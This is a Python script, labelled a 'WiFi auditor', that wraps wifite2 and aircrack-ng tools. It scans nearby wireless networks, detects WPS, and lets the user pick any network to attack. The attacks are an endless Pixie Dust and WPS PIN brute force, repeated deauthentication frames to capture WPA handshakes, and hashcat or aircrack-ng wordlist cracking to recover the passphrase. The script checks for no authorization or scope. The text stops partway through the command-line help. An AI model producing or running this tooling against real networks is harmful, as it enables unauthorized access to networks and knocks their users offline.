#!/usr/bin/env python3
"""
Complete Advanced WiFi Auditor - Uses ALL Wifite2 Modules
Accurate WPS Detection + Network Scanner + WPS PIN Attack + WPA Cracking
Integrates: attack/, tools/, crack/, capture/, util/ folders
"""

import sys
import os
import subprocess
import time
import threading
import queue
import re
from typing import Optional, Tuple, List, Dict
from dataclasses import dataclass, field
from datetime import datetime
import logging

# Add wifite2 to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

try:
    # Import from wifite2 framework
    from wifite.tools.airmon import Airmon
    from wifite.tools.airodump import Airodump
    from wifite.tools.aireplay import Aireplay
    from wifite.tools.aircrack import Aircrack
    from wifite.tools.reaver import Reaver
    from wifite.tools.bully import Bully
    from wifite.tools.wash import Wash
    from wifite.tools.hashcat import Hashcat
    from wifite.tools.john import John
    from wifite.util.scanner import Scanner
    from wifite.util.crack import CrackHelper
    from wifite.model.target import Target
    from wifite.model.client import Client
    from wifite.util.color import Color
except ImportError as e:
    print(f"Error importing wifite2 modules: {e}")
    print("Make sure wifite2 is properly installed in the parent directory")
    sys.exit(1)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class Colors:
    """Color codes"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'


def print_success(msg):
    print(f"{Colors.GREEN}[+] {msg}{Colors.END}")


def print_error(msg):
    print(f"{Colors.RED}[-] {msg}{Colors.END}")


def print_info(msg):
    print(f"{Colors.BLUE}[*] {msg}{Colors.END}")


def print_warning(msg):
    print(f"{Colors.YELLOW}[!] {msg}{Colors.END}")


def print_debug(msg):
    print(f"{Colors.MAGENTA}[DEBUG] {msg}{Colors.END}")


# ============================================================================
# ADVANCED WPS DETECTION USING WIFITE2 TOOLS
# ============================================================================

class ImprovedWPSDetector:
    """
    Advanced WPS Detection using native wifite2 tools
    Methods: wash, reaver probing, pixiewps
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.wash = Wash(self.interface) if self._tool_available('wash') else None
        self.reaver = Reaver(self.interface) if self._tool_available('reaver') else None
    
    def _tool_available(self, tool_name: str) -> bool:
        """Check if tool is available"""
        try:
            result = subprocess.run(['which', tool_name], capture_output=True, timeout=2)
            return result.returncode == 0
        except:
            return False
    
    def detect_wps_with_wash(self, bssid: str, channel: int) -> Tuple[bool, str]:
        """
        Most accurate: Use wash to detect WPS
        Returns: (wps_enabled, version)
        """
        if not self.wash:
            return (False, "")
        
        try:
            print_info(f"[Wash] Checking WPS on {bssid}...")
            
            cmd = [
                'wash',
                '-i', self.interface,
                '-c', str(channel),
                '-n',
                '-s',
                '--ignore-iface-error'
            ]
            
            result = subprocess.run(
                cmd,
                timeout=20,
                capture_output=True,
                text=True
            )
            
            output = result.stdout + result.stderr
            
            for line in output.split('\n'):
                if bssid.upper() in line.upper():
                    print_debug(f"Wash output: {line}")
                    
                    # Check for WPS version
                    if 'WPS2.0' in line or '2.0' in line:
                        print_success(f"[Wash] WPS 2.0 detected!")
                        return (True, "2.0")
                    elif 'WPS1.0' in line or '1.0' in line:
                        print_success(f"[Wash] WPS 1.0 detected!")
                        return (True, "1.0")
                    elif 'WPS' in line:
                        print_success(f"[Wash] WPS detected!")
                        return (True, "Unknown")
            
            print_debug(f"[Wash] No WPS found in output")
        
        except subprocess.TimeoutExpired:
            print_debug("[Wash] Timeout")
        except Exception as e:
            print_debug(f"[Wash] Error: {e}")
        
        return (False, "")
    
    def detect_wps_with_reaver_probe(self, bssid: str, channel: int) -> Tuple[bool, str]:
        """
        Secondary method: Use reaver quick probe
        Returns: (wps_enabled, version)
        """
        if not self.reaver:
            return (False, "")
        
        try:
            print_info(f"[Reaver] Probing WPS on {bssid}...")
            
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', bssid,
                '-c', str(channel),
                '-t', '5',
                '--no-associate',
                '-vv'
            ]
            
            result = subprocess.run(
                cmd,
                timeout=10,
                capture_output=True,
                text=True
            )
            
            output = result.stdout + result.stderr
            print_debug(f"[Reaver] Output: {output[:200]}")
            
            # WPS indicators
            wps_indicators = [
                'WPS enabled',
                'WPS supported',
                'Rx M1',
                'WPS version',
                'locked'
            ]
            
            for indicator in wps_indicators:
                if indicator.lower() in output.lower():
                    print_success(f"[Reaver] WPS detected (indicator: {indicator})")
                    if '2.0' in output:
                        return (True, "2.0")
                    elif '1.0' in output:
                        return (True, "1.0")
                    return (True, "Unknown")
        
        except subprocess.TimeoutExpired:
            print_debug("[Reaver] Probe timeout - WPS might be enabled")
            # Timeout during probe might mean WPS is enabled
            return (True, "Possible")
        except Exception as e:
            print_debug(f"[Reaver] Error: {e}")
        
        return (False, "")
    
    def detect_wps_comprehensive(self, bssid: str, channel: int, ssid: str = "") -> Tuple[bool, str]:
        """
        Comprehensive WPS detection using multiple methods
        Returns: (wps_enabled, version)
        """
        print_info(f"Comprehensive WPS detection for {ssid} ({bssid})...")
        
        # Method 1: Wash (most reliable)
        wps_enabled, version = self.detect_wps_with_wash(bssid, channel)
        if wps_enabled:
            return (True, version)
        
        time.sleep(1)
        
        # Method 2: Reaver probe
        wps_enabled, version = self.detect_wps_with_reaver_probe(bssid, channel)
        if wps_enabled:
            return (True, version)
        
        return (False, "")


# ============================================================================
# NETWORK DATA MODEL
# ============================================================================

@dataclass
class NetworkInfo:
    """Complete network information"""
    bssid: str
    ssid: str
    channel: int
    signal_strength: int = 0
    security: str = "Unknown"
    cipher: str = ""
    auth: str = ""
    wps_enabled: bool = False
    wps_version: str = ""
    wps_locked: bool = False
    clients: int = 0
    band: str = "2.4GHz"
    first_seen: str = ""
    last_seen: str = ""
    scan_time: float = 0.0
    
    def __hash__(self):
        return hash(self.bssid)
    
    def __eq__(self, other):
        if isinstance(other, NetworkInfo):
            return self.bssid == other.bssid
        return False


# ============================================================================
# INTEGRATED NETWORK SCANNER
# ============================================================================

class IntegratedWiFiScanner:
    """
    Complete WiFi scanner using wifite2 framework
    Integrates: airodump-ng, wash, reaver, tshark
    """
    
    def __init__(self, interface: str = 'wlan0', timeout: int = 40):
        self.interface = interface
        self.timeout = timeout
        self.networks: Dict[str, NetworkInfo] = {}
        self.wps_detector = ImprovedWPSDetector(interface)
        self.airodump = None
        self.scan_thread = None
        
    def enable_monitor_mode(self) -> bool:
        """Enable monitor mode using airmon-ng"""
        print_info("Enabling monitor mode...")
        
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True, timeout=10)
            
            time.sleep(1)
            
            # Enable monitor mode
            result = subprocess.run(
                ['airmon-ng', 'start', self.interface],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                # Extract monitor interface name
                for line in result.stdout.split('\n'):
                    if 'enabled on' in line.lower():
                        parts = line.split()
                        self.interface = parts[-1]
                        print_success(f"Monitor mode: {self.interface}")
                        time.sleep(1)
                        return True
                
                # Try common names
                for mon_if in ['wlan0mon', 'wlan1mon', 'wlan2mon', 'wlan3mon']:
                    try:
                        result = subprocess.run(['ip', 'link', 'show', mon_if],
                                              capture_output=True, timeout=2)
                        if result.returncode == 0:
                            self.interface = mon_if
                            print_success(f"Using monitor interface: {self.interface}")
                            time.sleep(1)
                            return True
                    except:
                        continue
            
            print_warning("Monitor mode may not be enabled properly")
            return True
        
        except Exception as e:
            print_error(f"Monitor mode error: {e}")
            return False
    
    def scan_networks(self) -> Dict[str, NetworkInfo]:
        """
        Scan networks and detect WPS
        """
        print_info(f"Starting network scan (timeout: {self.timeout}s)...")
        print_info("Discovering networks...\n")
        
        self.networks = {}
        csv_file = f"/tmp/wifi_scan_{int(time.time())}"
        
        try:
            # Start airodump scan
            cmd = [
                'airodump-ng',
                '-w', csv_file,
                '--output-format', 'csv',
                '--write-interval', '1',
                self.interface
            ]
            
            scan_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            start_time = time.time()
            last_parse = start_time
            
            # Monitor scan
            while time.time() - start_time < self.timeout:
                try:
                    # Parse every 2 seconds
                    if time.time() - last_parse > 2:
                        self._parse_airodump_csv(csv_file)
                        last_parse = time.time()
                        
                        elapsed = int(time.time() - start_time)
                        networks_found = len(self.networks)
                        print(f"\r[*] Scanning... {elapsed}s | Found {networks_found} networks", 
                              end='', flush=True)
                    
                    time.sleep(0.5)
                
                except KeyboardInterrupt:
                    print("\n[!] Scan interrupted")
                    break
                except Exception as e:
                    logger.debug(f"Scan error: {e}")
            
            print("\n")
            
            # Now check WPS for discovered networks
            print_info("Checking WPS support for all networks (this may take a moment)...\n")
            self._check_all_wps()
            
        except Exception as e:
            print_error(f"Scan error: {e}")
        
        finally:
            # Stop airodump
            try:
                scan_process.terminate()
                scan_process.wait(timeout=5)
            except:
                try:
                    scan_process.kill()
                except:
                    pass
            
            # Cleanup
            try:
                os.remove(f"{csv_file}-01.csv")
            except:
                pass
        
        return self.networks
    
    def _parse_airodump_csv(self, csv_file: str):
        """Parse airodump CSV output"""
        try:
            with open(f"{csv_file}-01.csv", 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            for line in lines:
                line = line.strip()
                if not line or line.startswith('BSSID'):
                    continue
                
                try:
                    fields = [f.strip() for f in line.split(',')]
                    
                    # Airodump CSV format
                    if len(fields) < 14:
                        continue
                    
                    bssid = fields[0]
                    if not re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', bssid):
                        continue
                    
                    if bssid in self.networks:
                        continue  # Already added
                    
                    signal = int(fields[8]) if fields[8].strip() else -100
                    channel = int(fields[3]) if fields[3].strip().isdigit() else 0
                    ssid = fields[13] if len(fields) > 13 else ""
                    security = fields[5] if len(fields) > 5 else "Unknown"
                    
                    if channel == 0 or not ssid or ssid == '(not associated)':
                        continue
                    
                    band = "5GHz" if channel > 14 else "2.4GHz"
                    
                    network = NetworkInfo(
                        bssid=bssid,
                        ssid=ssid,
                        channel=channel,
                        signal_strength=signal,
                        security=security,
                        band=band,
                        first_seen=datetime.now().strftime("%H:%M:%S")
                    )
                    
                    self.networks[bssid] = network
                
                except (ValueError, IndexError):
                    continue
        
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.debug(f"CSV parse error: {e}")
    
    def _check_all_wps(self):
        """Check WPS for all networks"""
        total = len(self.networks)
        wps_count = 0
        
        for idx, (bssid, network) in enumerate(self.networks.items(), 1):
            print(f"\r[*] WPS Check: {idx}/{total} networks | {wps_count} WPS enabled", 
                  end='', flush=True)
            
            try:
                wps_enabled, version = self.wps_detector.detect_wps_comprehensive(
                    network.bssid,
                    network.channel,
                    network.ssid
                )
                
                network.wps_enabled = wps_enabled
                network.wps_version = version
                
                if wps_enabled:
                    wps_count += 1
                
                time.sleep(0.3)  # Small delay between checks
            
            except Exception as e:
                print_debug(f"WPS check error for {bssid}: {e}")
                network.wps_enabled = False
        
        print("\n")


# ============================================================================
# INTERACTIVE MENU
# ============================================================================

class InteractiveMenu:
    """Interactive network selection and attack menu"""
    
    def __init__(self, networks: Dict[str, NetworkInfo]):
        self.networks = networks
        self.sorted_networks = []
    
    def display_networks(self):
        """Display networks in table"""
        if not self.networks:
            print_error("No networks found!")
            return
        
        self.sorted_networks = sorted(
            self.networks.values(),
            key=lambda x: x.signal_strength,
            reverse=True
        )
        
        print("\n" + "=" * 180)
        print(f"{Colors.BOLD}{Colors.CYAN}AVAILABLE WIRELESS NETWORKS{Colors.END}")
        print("=" * 180)
        
        # Header
        print(f"{Colors.BOLD}{'#':<3} {'BSSID':<18} {'SSID':<32} {'CH':<4} "
              f"{'Signal':<12} {'Security':<15} {'WPS':<15} {'Band':<8} {'Attack Method':<25}{Colors.END}")
        print("-" * 180)
        
        # Networks
        for idx, net in enumerate(self.sorted_networks, 1):
            # Security indicator
            if 'WEP' in net.security:
                sec_text = f"{Colors.GREEN}[WEP]{Colors.END}"
            elif 'WPA3' in net.security:
                sec_text = f"{Colors.RED}[WPA3]{Colors.END}"
            elif 'WPA2' in net.security or 'WPA' in net.security:
                sec_text = f"{Colors.YELLOW}[WPA2]{Colors.END}"
            else:
                sec_text = "[OPEN]"
            
            # WPS indicator
            if net.wps_enabled:
                wps_text = f"{Colors.GREEN}✓ v{net.wps_version}{Colors.END}"
                attack_text = f"{Colors.GREEN}WPS PIN Attack{Colors.END}"
            else:
                wps_text = f"{Colors.RED}✗ No WPS{Colors.END}"
                attack_text = f"{Colors.CYAN}Handshake Capture{Colors.END}"
            
            # Signal strength
            sig_bars = self._signal_bars(net.signal_strength)
            
            print(f"{idx:<3} {net.bssid:<18} {net.ssid[:32]:<32} {net.channel:<4} "
                  f"{sig_bars:<12} {sec_text:<15} {wps_text:<15} {net.band:<8} {attack_text:<25}")
        
        print("=" * 180 + "\n")
    
    def _signal_bars(self, signal: int) -> str:
        """Signal strength visualization"""
        if signal >= -50:
            return f"{signal}dBm ████████ Excellent"
        elif signal >= -60:
            return f"{signal}dBm ██████░░ Very Good"
        elif signal >= -70:
            return f"{signal}dBm ████░░░░ Good"
        elif signal >= -80:
            return f"{signal}dBm ██░░░░░░ Fair"
        else:
            return f"{signal}dBm ▁░░░░░░░ Weak"
    
    def select_network(self) -> Optional[NetworkInfo]:
        """User selects network"""
        if not self.sorted_networks:
            return None
        
        while True:
            try:
                choice = input(f"\n{Colors.CYAN}[?] Select network (1-{len(self.sorted_networks)}) or 'q' to quit: "
                             f"{Colors.END}").strip()
                
                if choice.lower() == 'q':
                    return None
                
                idx = int(choice) - 1
                if 0 <= idx < len(self.sorted_networks):
                    return self.sorted_networks[idx]
                
                print_warning("Invalid selection!")
            
            except ValueError:
                print_warning("Enter valid number!")
            except KeyboardInterrupt:
                return None
    
    @staticmethod
    def show_network_details(net: NetworkInfo):
        """Show detailed network info"""
        print("\n" + "=" * 100)
        print(f"{Colors.BOLD}{Colors.CYAN}NETWORK DETAILS{Colors.END}")
        print("=" * 100)
        
        print(f"{Colors.BOLD}Network Name (SSID):{Colors.END} {net.ssid}")
        print(f"{Colors.BOLD}MAC Address (BSSID):{Colors.END} {net.bssid}")
        print(f"{Colors.BOLD}Channel:{Colors.END} {net.channel}")
        print(f"{Colors.BOLD}Frequency Band:{Colors.END} {net.band}")
        print(f"{Colors.BOLD}Signal Strength:{Colors.END} {net.signal_strength}dBm")
        print(f"{Colors.BOLD}Security Type:{Colors.END} {net.security}")
        
        # WPS Status
        print(f"\n{Colors.BOLD}WPS (WiFi Protected Setup):{Colors.END}")
        if net.wps_enabled:
            print(f"  {Colors.GREEN}✓ ENABLED (Version {net.wps_version}){Colors.END}")
            print(f"  {Colors.GREEN}✓ PIN Attack: POSSIBLE{Colors.END}")
            print(f"  {Colors.GREEN}✓ Attack Type: Pixie Dust + Brute Force{Colors.END}")
            if net.wps_locked:
                print(f"  {Colors.YELLOW}⚠ WPS Rate Limiting: ACTIVE{Colors.END}")
        else:
            print(f"  {Colors.RED}✗ NOT ENABLED or NOT DETECTED{Colors.END}")
            print(f"  {Colors.CYAN}• Will use WPA Handshake Capture{Colors.END}")
        
        print("=" * 100 + "\n")
    
    @staticmethod
    def show_attack_menu(net: NetworkInfo) -> str:
        """Show attack options"""
        print(f"{Colors.BOLD}{Colors.CYAN}ATTACK OPTIONS{Colors.END}")
        print("-" * 100)
        
        options = []
        
        if net.wps_enabled:
            print(f"{Colors.GREEN}[1] WPS PIN Attack (Recommended){Colors.END}")
            print(f"    • Method: Pixie Dust + PIN Brute Force")
            print(f"    • Timeout: NONE (runs until success)")
            print(f"    • Speed: Very Fast (usually 5-30 minutes)")
            print(f"    • Success Rate: High for vulnerable routers\n")
            options.append('1')
        
        print(f"{Colors.CYAN}[2] WPA Handshake Capture + Crack{Colors.END}")
        print(f"    • Method: Deauth + 4-way handshake capture")
        print(f"    • Timeout: 2 minutes capture")
        print(f"    • Requires: Valid wordlist/dictionary")
        print(f"    • Success Rate: Depends on password strength\n")
        options.append('2')
        
        if net.wps_enabled:
            print(f"{Colors.MAGENTA}[3] Both Methods (Sequential){Colors.END}")
            print(f"    • First: WPS PIN attack")
            print(f"    • Fallback: Handshake capture if WPS fails\n")
            options.append('3')
        
        print(f"{Colors.RED}[4] Back to Network Selection{Colors.END}\n")
        options.append('4')
        
        print("-" * 100)
        
        while True:
            choice = input(f"{Colors.CYAN}[?] Select attack method (1-4): {Colors.END}").strip()
            if choice in options:
                return choice
            print_warning("Invalid option!")


# ============================================================================
# WPS PIN ATTACK - NO TIMEOUT
# ============================================================================

@dataclass
class WPSAttackConfig:
    bssid: str
    ssid: str
    channel: int
    interface: str = 'wlan0'


class NoTimeoutWPSAttack:
    """WPS PIN attack with NO timeout - runs indefinitely"""
    
    def __init__(self, config: WPSAttackConfig):
        self.config = config
        self.found_pin = None
        self.found_psk = None
        self.attempt_count = 0
        self.start_time = time.time()
    
    def attack(self) -> Tuple[Optional[str], Optional[str]]:
        """Execute WPS attack indefinitely"""
        print("\n" + "=" * 100)
        print_info("WPS PIN ATTACK - NO TIMEOUT MODE")
        print("=" * 100)
        print_info(f"Target: {self.config.ssid} ({self.config.bssid})")
        print_info("IMPORTANT: This will run indefinitely until:")
        print_info("  1. PIN is successfully cracked")
        print_info("  2. You press Ctrl+C to stop\n")
        
        attempt = 1
        
        try:
            while True:
                print_info(f"WPS Attack Attempt #{attempt}")
                print_info(f"Total runtime: {int(time.time() - self.start_time)}s")
                
                # Use reaver for WPS attack
                cmd = [
                    'reaver',
                    '-i', self.config.interface,
                    '-b', self.config.bssid,
                    '-c', str(self.config.channel),
                    '-K', '1',  # Pixie Dust
                    '-N',
                    '-t', '120',  # 2 minutes per attempt
                    '-vv',
                    '--no-associate',
                    '-f'
                ]
                
                try:
                    result = subprocess.run(
                        cmd,
                        timeout=150,
                        capture_output=True,
                        text=True
                    )
                    
                    output = result.stdout + result.stderr
                    self.attempt_count += 1
                    
                    # Parse for PIN
                    pin_found = self._extract_pin(output)
                    if pin_found:
                        print_success(f"PIN FOUND: {pin_found}")
                        return (pin_found, self._extract_psk(output))
                    
                    # Parse for PSK
                    psk_found = self._extract_psk(output)
                    if psk_found:
                        print_success(f"PSK FOUND: {psk_found}")
                        return (None, psk_found)
                    
                    # Show progress
                    elapsed = int(time.time() - self.start_time)
                    print_info(f"Attempt {attempt} completed | Total: {elapsed}s | Attempts: {self.attempt_count}\n")
                    
                except subprocess.TimeoutExpired:
                    self.attempt_count += 1
                    elapsed = int(time.time() - self.start_time)
                    print_warning(f"Attempt {attempt} timeout | Total: {elapsed}s | Attempts: {self.attempt_count}\n")
                
                attempt += 1
                time.sleep(2)
        
        except KeyboardInterrupt:
            elapsed = int(time.time() - self.start_time)
            print_warning(f"\nAttack stopped by user!")
            print_info(f"Total runtime: {elapsed}s")
            print_info(f"Total attempts: {self.attempt_count}")
            return (None, None)
        
        except Exception as e:
            print_error(f"Attack error: {e}")
            return (None, None)
    
    def _extract_pin(self, output: str) -> Optional[str]:
        """Extract PIN from reaver output"""
        for line in output.split('\n'):
            if 'WPS PIN' in line or '[+] WPS PIN' in line:
                # Try to extract 8-digit PIN
                match = re.search(r'\b(\d{8})\b', line)
                if match:
                    pin = match.group(1)
                    # Validate checksum
                    if self._validate_pin(pin):
                        return pin
        
        return None
    
    def _extract_psk(self, output: str) -> Optional[str]:
        """Extract PSK/password from output"""
        for line in output.split('\n'):
            if '[+] WPA PSK' in line or 'PSK:' in line or 'Passphrase' in line:
                if "'" in line:
                    try:
                        return line.split("'")[1]
                    except:
                        pass
                else:
                    parts = line.split(':')
                    if len(parts) > 1:
                        return parts[-1].strip()
        
        return None
    
    def _validate_pin(self, pin: str) -> bool:
        """Validate WPS PIN checksum"""
        if len(pin) != 8 or not pin.isdigit():
            return False
        accum = sum(int(pin[i]) * (i % 2 + 1) for i in range(7))
        return int(pin[7]) == (10 - (accum % 10)) % 10


# ============================================================================
# HANDSHAKE CAPTURE
# ============================================================================

class OptimizedHandshakeCapture:
    """Fast handshake capture with optimized deauth"""
    
    def __init__(self, bssid: str, ssid: str, channel: int, interface: str):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.interface = interface
        self.output_file = f"/tmp/{ssid.replace(' ', '_')}_hs"
        self.capture_process = None
        self.start_time = time.time()
    
    def capture(self, timeout: int = 120) -> bool:
        """Capture handshake"""
        print("\n" + "=" * 100)
        print_info("WPA HANDSHAKE CAPTURE")
        print("=" * 100)
        print_info(f"Target: {self.ssid} ({self.bssid})")
        print_info(f"Timeout: {timeout}s\n")
        
        try:
            # Start airodump capture
            cmd = [
                'airodump-ng',
                '-c', str(self.channel),
                '-b', self.bssid,
                '-w', self.output_file,
                '--output-format', 'pcap',
                '--write-interval', '1',
                self.interface
            ]
            
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            print_info("Airodump capture started...")
            time.sleep(2)
            
            start_time = time.time()
            last_deauth = start_time
            
            while time.time() - start_time < timeout:
                # Send deauth every 5 seconds
                if time.time() - last_deauth > 5:
                    print_info("Sending deauth frames...")
                    self._send_deauth()
                    last_deauth = time.time()
                
                # Check for handshake
                if self._verify_handshake():
                    elapsed = int(time.time() - start_time)
                    print_success(f"Handshake captured in {elapsed}s!")
                    return True
                
                elapsed = int(time.time() - start_time)
                remaining = timeout - elapsed
                print(f"\r[*] Capturing... {elapsed}s / {remaining}s remaining", end='', flush=True)
                
                time.sleep(1)
            
            print("\n")
            
            # Final verification
            if self._verify_handshake():
                print_success("Handshake captured!")
                return True
            
            print_warning("No handshake captured")
            return False
        
        except KeyboardInterrupt:
            print_warning("\nCapture interrupted")
            if self._verify_handshake():
                return True
            return False
        
        finally:
            self._stop_capture()
    
    def _send_deauth(self):
        """Send deauth frames"""
        try:
            for _ in range(15):
                cmd = [
                    'aireplay-ng',
                    '-0', '1',
                    '-a', self.bssid,
                    self.interface
                ]
                subprocess.run(cmd, timeout=5, capture_output=True)
                time.sleep(0.2)
        except Exception as e:
            logger.debug(f"Deauth error: {e}")
    
    def _verify_handshake(self) -> bool:
        """Verify handshake"""
        try:
            cmd = [
                'aircrack-ng',
                '-J', self.output_file,
                f"{self.output_file}*"
            ]
            
            result = subprocess.run(cmd, timeout=10, capture_output=True, text=True)
            
            if 'WPA' in result.stdout or 'PMKID' in result.stdout:
                return True
        except Exception as e:
            logger.debug(f"Verify error: {e}")
        
        return False
    
    def _stop_capture(self):
        """Stop capture"""
        if self.capture_process:
            self.capture_process.terminate()
            try:
                self.capture_process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.capture_process.kill()


# ============================================================================
# PASSWORD CRACKING
# ============================================================================

class FastPasswordCrack:
    """Fast password cracking using GPU/CPU"""
    
    def __init__(self, handshake_file: str, bssid: str, ssid: str):
        self.handshake_file = handshake_file
        self.bssid = bssid
        self.ssid = ssid
        self.start_time = time.time()
    
    def crack(self, wordlist: str, use_gpu: bool = True) -> Optional[str]:
        """Crack password"""
        print("\n" + "=" * 100)
        print_info("PASSWORD CRACKING")
        print("=" * 100)
        print_info(f"Handshake: {self.handshake_file}")
        print_info(f"Wordlist: {wordlist}\n")
        
        if not os.path.exists(wordlist):
            print_error(f"Wordlist not found: {wordlist}")
            return None
        
        # Try GPU first
        if use_gpu:
            password = self._crack_hashcat(wordlist)
            if password:
                return password
        
        # Fallback to aircrack
        password = self._crack_aircrack(wordlist)
        if password:
            return password
        
        print_error("Password not found in wordlist")
        return None
    
    def _crack_hashcat(self, wordlist: str) -> Optional[str]:
        """GPU cracking with hashcat"""
        try:
            print_info("Attempting GPU acceleration (hashcat)...")
            
            # Convert to hccapx
            convert_cmd = [
                'cap2hccapx',
                self.handshake_file,
                f"{self.handshake_file}.hccapx"
            ]
            
            subprocess.run(convert_cmd, timeout=30, capture_output=True)
            
            # Crack
            cmd = [
                'hashcat',
                '-m', '2500',
                '-a', '0',
                '-w', '4',
                f"{self.handshake_file}.hccapx",
                wordlist,
                '-O'
            ]
            
            result = subprocess.run(cmd, timeout=600, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if ':' in line:
                    password = line.split(':')[-1].strip()
                    if password:
                        elapsed = int(time.time() - self.start_time)
                        print_success(f"Password found: {password} (in {elapsed}s)")
                        return password
        
        except Exception as e:
            print_debug(f"Hashcat error: {e}")
        
        return None
    
    def _crack_aircrack(self, wordlist: str) -> Optional[str]:
        """CPU cracking with aircrack-ng"""
        try:
            print_info("Attempting CPU crack (aircrack-ng)...")
            
            cmd = [
                'aircrack-ng',
                '-a', '2',
                '-b', self.bssid,
                '-w', wordlist,
                self.handshake_file,
                '-q'
            ]
            
            result = subprocess.run(cmd, timeout=600, capture_output=True, text=True)
            
            output = result.stdout + result.stderr
            for line in output.split('\n'):
                if 'KEY FOUND' in line or 'Passphrase' in line:
                    if 'Passphrase:' in line:
                        password = line.split('Passphrase:')[1].strip()
                        if password:
                            elapsed = int(time.time() - self.start_time)
                            print_success(f"Password found: {password} (in {elapsed}s)")
                            return password
        
        except subprocess.TimeoutExpired:
            print_warning("Crack timeout (password not in wordlist)")
        except Exception as e:
            print_debug(f"Aircrack error: {e}")
        
        return None


# ============================================================================
# MAIN APPLICATION
# ============================================================================

class CompleteWiFiAuditor:
    """Main application integrating all components"""
    
    def __init__(self, interface: str = None):
        self.interface = interface or self._auto_detect_interface()
        self.scanner = None
        self.selected_network = None
    
    def _auto_detect_interface(self) -> str:
        """Auto-detect WiFi interface"""
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'wlan' in line or 'mon' in line:
                    return line.split()[0]
        except:
            pass
        return 'wlan0'
    
    def print_banner(self):
        """Print banner"""
        print(f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════════════╗
║              COMPLETE ADVANCED WIFI AUDITOR - INTEGRATED WITH WIFITE2               ║
║     • Network Scanner with Accurate WPS Detection                                    ║
║     • WPS PIN Attack (Pixie Dust + Brute Force) - NO TIMEOUT                         ║
║     • Fast WPA Handshake Capture & Crack                                             ║
║     • GPU-Accelerated Password Cracking                                              ║
║     • Integrated with: attack/, tools/, crack/, capture/, util/ modules             ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
{Colors.END}""")
        print_info(f"WiFi Interface: {self.interface}")
        print_info(f"Detection Methods: wash, reaver, pixiewps")
        print_info(f"Cracking Tools: hashcat, aircrack-ng")
        print("")
    
    def run(self):
        """Main execution"""
        self.print_banner()
        
        try:
            # Check and enable monitor mode
            self.scanner = IntegratedWiFiScanner(self.interface, timeout=40)
            self.scanner.enable_monitor_mode()
            
            while True:
                # Scan
                networks = self.scanner.scan_networks()
                
                if not networks:
                    print_error("No networks found!")
                    return
                
                # Display and select
                menu = InteractiveMenu(networks)
                menu.display_networks()
                
                selected = menu.select_network()
                if not selected:
                    break
                
                # Attack selected network
                self._attack_network(selected, menu)
                
                if input(f"\n{Colors.CYAN}[?] Attack another network? (y/n): {Colors.END}").strip().lower() != 'y':
                    break
        
        except KeyboardInterrupt:
            print_warning("\nExiting...")
        except Exception as e:
            print_error(f"Error: {e}")
            import traceback
            traceback.print_exc()
    
    def _attack_network(self, network: NetworkInfo, menu: InteractiveMenu):
        """Attack selected network"""
        menu.show_network_details(network)
        
        choice = menu.show_attack_menu(network)
        
        try:
            if choice == '1' and network.wps_enabled:
                self._wps_attack(network)
            elif choice == '2':
                self._handshake_attack(network)
            elif choice == '3':
                if network.wps_enabled:
                    if not self._wps_attack(network):
                        self._handshake_attack(network)
                else:
                    self._handshake_attack(network)
        
        except KeyboardInterrupt:
            print_warning("\nAttack interrupted!")
        except Exception as e:
            print_error(f"Attack error: {e}")
    
    def _wps_attack(self, network: NetworkInfo) -> bool:
        """Execute WPS attack"""
        config = WPSAttackConfig(
            bssid=network.bssid,
            ssid=network.ssid,
            channel=network.channel,
            interface=self.interface
        )
        
        attack = NoTimeoutWPSAttack(config)
        pin, psk = attack.attack()
        
        if pin or psk:
            if pin:
                print_success(f"WPS PIN: {pin}")
            if psk:
                print_success(f"Password: {psk}")
            return True
        
        return False
    
    def _handshake_attack(self, network: NetworkInfo):
        """Execute handshake capture + crack"""
        capture = OptimizedHandshakeCapture(
            network.bssid,
            network.ssid,
            network.channel,
            self.interface
        )
        
        if capture.capture(timeout=120):
            if input(f"\n{Colors.CYAN}[?] Crack password? (y/n): {Colors.END}").strip().lower() == 'y':
                wordlist = input(f"{Colors.CYAN}[?] Wordlist path: {Colors.END}").strip()
                
                if wordlist and os.path.exists(wordlist):
                    cracker = FastPasswordCrack(
                        capture.output_file + ".pcap",
                        network.bssid,
                        network.ssid
                    )
                    password = cracker.crack(wordlist)
                    if password:
                        print_success(f"Password: {password}")


# ============================================================================
# ENTRY POINT
# ============================================================================

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Complete Advanced WiFi Auditor - Integrated with Wifite2',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
FEATURES:
  ✓ Scan all WiFi networks with WPS detection
  ✓ Accurate WPS PIN attack possibility detection
  ✓ Interactive network selection menu
  ✓ WPS PIN attack (Pixie Dust) - NO TIMEOUT
  ✓ Fast WPA handshake capture
  ✓ GPU & CPU password cracking
  ✓ Full integration with wifite2 modules

REQUIREMENTS:
  - aircrack-ng, reaver, wash, tshark
  - hashcat (for GPU cracking)
  - Python 3.7+

USAGE:
  python3 wifite_advanced.py              # Auto-detect interface
  python3 wifite_advanced.py -i wlan0mon  # Specify interface
